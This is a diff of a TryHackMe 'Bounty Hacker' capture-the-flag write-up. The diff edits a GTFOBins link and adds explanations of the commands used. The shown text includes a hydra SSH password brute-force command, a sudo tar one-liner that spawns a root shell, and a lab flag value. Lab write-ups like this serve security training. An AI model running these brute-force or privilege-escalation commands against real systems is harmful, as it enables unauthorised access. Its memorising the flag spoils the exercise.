@@ -216,7 +216,7 @@ Matching Defaults entries for lin on bountyhacker:
 User lin may run the following commands on bountyhacker:
     (root) /bin/tar
 ```
-19. `firefox "https://gtfobins.github.io/gtfobins/tar/"` to launch firefox and direct it to go to the GTFOBins website and then we searched for the **tar** command
+19. `firefox "https://gtfobins.github.io/"` to launch firefox and direct it to go to the GTFOBins website and then we searched for the **tar** command
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bounty%20Hacker/GTFOBins%20Tar.pngGTFOBins%20Tar.png)
 20. `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` to escalate privileges by spawning in a Bourne shell (According to GTFOBins)
 21. `whoami` to see if we’re now logged in as a higher privileged account, which shows that we're now logged in as root
@@ -260,7 +260,7 @@ THM{80UN7Y_h4cK3r}
 14. `find / -type f -name user.txt 2>/dev/null`
 15. `cat {USER.TXT FILE PATH}`
 16. `sudo -l`
-17. `firefox "https://gtfobins.github.io/gtfobins/tar/"`
+17. `firefox "https://gtfobins.github.io/"`
 18. `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
 19. `whoami`
 20. `find / -type f -name root.txt 2>/dev/null`
@@ -275,23 +275,28 @@ THM{80UN7Y_h4cK3r}
 
 
 `hydra -l lin -P {FILE1}.txt ssh://{TARGET IP}`
-+ K
++ `-l lin` specifies that "**lin**" is the username to be used during the attack
++ `-P {FILE1}.txt` specifies the file containing the list of passwords to be used for the brute-force attack
++ `ssh://{TARGET IP}` specifies the SSH server that we want to attack
 
 
 `find / -type f -name user.txt 2>/dev/null`
-+ K
-
-
-`firefox "https://gtfobins.github.io/gtfobins/tar/"`
-+ K
++ `/` specifies the starting directory to be the root directory
++ `-type f` specifies that it should only search for regular files
++ `-name user.txt` specifies to search for a file called user.txt
++ `2>/dev/null` redirects error output (stderr) to the null device ensuring that any error message encountered during the search are suppressed and not displayed on the terminal
 
 
 `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
-+ K
++ 
 
 
 `find / -type f -name root.txt 2>/dev/null`
-+ K
++ `/` specifies the starting directory to be the root directory
++ `-type f` specifies that it should only search for regular files
++ `-name root.txt` specifies to search for a file called root.txt
++ `2>/dev/null` redirects error output (stderr) to the null device ensuring that any error message encountered during the search are suppressed and not displayed on the terminal
+
 
 # Contributions
 This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)
